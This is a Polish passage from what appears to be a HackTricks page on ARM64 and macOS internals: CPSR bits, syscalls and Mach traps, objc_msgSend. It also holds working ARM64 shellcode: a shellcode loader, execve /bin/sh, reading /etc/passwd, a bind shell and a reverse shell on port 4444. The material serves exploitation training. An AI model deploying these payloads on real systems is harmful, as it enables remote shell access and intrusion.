- Bity **`J`** i **`T`**: **`J`** powinien mieć wartość 0. Jeśli **`T`** ma wartość 0, używany jest zestaw instrukcji A32, a jeśli ma wartość 1 — T32.
- **IT Block State Register** (`ITSTATE`): Są to bity 10-15 oraz 25-26. Przechowują warunki dla instrukcji znajdujących się w grupie poprzedzonej **`IT`**.
- Bit **`E`**: Wskazuje **endianness**.
- **Mode and Exception Mask Bits** (0-4): Określają bieżący stan wykonywania. **5.** bit wskazuje, czy program działa jako 32-bitowy (1), czy 64-bitowy (0). Pozostałe 4 reprezentują aktualnie używany **exception mode** (gdy wystąpi wyjątek i jest on obsługiwany). Ustawiona liczba **wskazuje bieżący priorytet**, jeśli podczas obsługi tego wyjątku zostanie wyzwolony kolejny wyjątek.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Niektóre wyjątki można wyłączyć za pomocą bitów **`A`**, `I`, `F`. Jeśli **`A`** ma wartość 1, oznacza to, że będą wyzwalane **asynchronous aborts**. **`I`** konfiguruje reakcję na zewnętrzne sprzętowe **Interrupts Requests** (IRQ). `F` jest związany z **Fast Interrupt Requests** (FIR).

## macOS

### BSD syscalls

Sprawdź [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) lub uruchom `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls będą miały **x16 > 0**.

### Mach Traps

W pliku [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) sprawdź `mach_trap_table`, a w [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototypy. Maksymalna liczba Mach traps to `MACH_TRAP_TABLE_COUNT` = 128. Mach traps będą miały **x16 < 0**, więc należy wywoływać numery z poprzedniej listy ze **znakiem minus**: **`_kernelrpc_mach_vm_allocate_trap`** to **`-10`**.

Możesz również sprawdzić **`libsystem_kernel.dylib`** w disassemblerze, aby dowiedzieć się, jak wywoływać te (oraz BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Zauważ, że **Ida** i **Ghidra** mogą również dekompilować **konkretne dylibs** z cache, wystarczy przekazać cache.

> [!TIP]
> Czasami łatwiej jest sprawdzić kod **zdekompilowany** z **`libsystem_kernel.dylib`**, **niż** sprawdzać **kod źródłowy**, ponieważ kod kilku syscalli (BSD i Mach) jest generowany za pomocą skryptów (sprawdź komentarze w kodzie źródłowym), podczas gdy w dylib można znaleźć to, co jest wywoływane.

### Wywołania machdep

XNU obsługuje inny typ wywołań nazywanych machine dependent. Numery tych wywołań zależą od architektury i ani wywołania, ani numery nie muszą pozostać stałe.

### comm page

Jest to strona pamięci należąca do kernela, mapowana w przestrzeni adresowej każdego procesu użytkownika. Ma ona sprawić, że przejście z trybu użytkownika do przestrzeni kernela będzie szybsze niż używanie syscalli dla usług kernela, które są wykorzystywane tak często, że takie przejście byłoby bardzo nieefektywne.

Na przykład wywołanie `gettimeofdate` odczytuje wartość `timeval` bezpośrednio z comm page.

### objc_msgSend

Bardzo często można znaleźć tę funkcję w programach Objective-C lub Swift. Funkcja ta umożliwia wywołanie metody obiektu Objective-C.

Parametry ([więcej informacji w dokumentacji](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Wskaźnik do instancji
- x1: op -> Selector metody
- x2... -> Pozostałe argumenty wywoływanej metody

Jeśli więc ustawisz breakpoint przed branch do tej funkcji, możesz łatwo sprawdzić w lldb, co jest wywoływane (w tym przykładzie obiekt wywołuje obiekt z `NSConcreteTask`, który uruchomi polecenie):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ustawiając zmienną środowiskową **`NSObjCMessageLoggingEnabled=1`**, można logować moment wywołania tej funkcji w pliku takim jak `/tmp/msgSends-pid`.
>
> Ponadto, ustawiając **`OBJC_HELP=1`** i wywołując dowolny binary, można zobaczyć inne zmienne środowiskowe, których można użyć do **logowania**, kiedy wystąpią określone działania Objc-C.

Po wywołaniu tej funkcji należy znaleźć wywołaną metodę wskazanej instancji. W tym celu wykonywane są następujące wyszukiwania:

- Wykonaj optimistic cache lookup:
- Jeśli zakończy się powodzeniem, zakończ
- Uzyskaj runtimeLock (read)
- Jeśli `(realize && !cls->realized)`, zrealizuj klasę
- Jeśli `(initialize && !cls->initialized)`, zainicjalizuj klasę
- Spróbuj użyć własnego cache klasy:
- Jeśli zakończy się powodzeniem, zakończ
- Spróbuj użyć listy metod klasy:
- Jeśli znaleziono, wypełnij cache i zakończ
- Spróbuj użyć cache superclass:
- Jeśli zakończy się powodzeniem, zakończ
- Spróbuj użyć listy metod superclass:
- Jeśli znaleziono, wypełnij cache i zakończ
- Jeśli `(resolver)`, spróbuj użyć method resolver i powtórz od class lookup
- Jeśli nadal tutaj jesteśmy (= wszystkie pozostałe próby zakończyły się niepowodzeniem), spróbuj użyć forwarder

### Shellcodes

Aby skompilować:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Aby wyodrębnić bajty:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
W nowszych wersjach macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Kod C do testowania shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Pobrano z [**tego miejsca**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i wyjaśniono.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Odczyt za pomocą cat

Celem jest wykonanie `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, więc drugi argument (x1) jest tablicą parametrów (co w pamięci oznacza stos adresów).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Uruchom polecenie za pomocą sh z procesu utworzonego przez fork, aby główny proces nie został zakończony
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell z [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **porcie 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Z [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell do **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Referencje

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
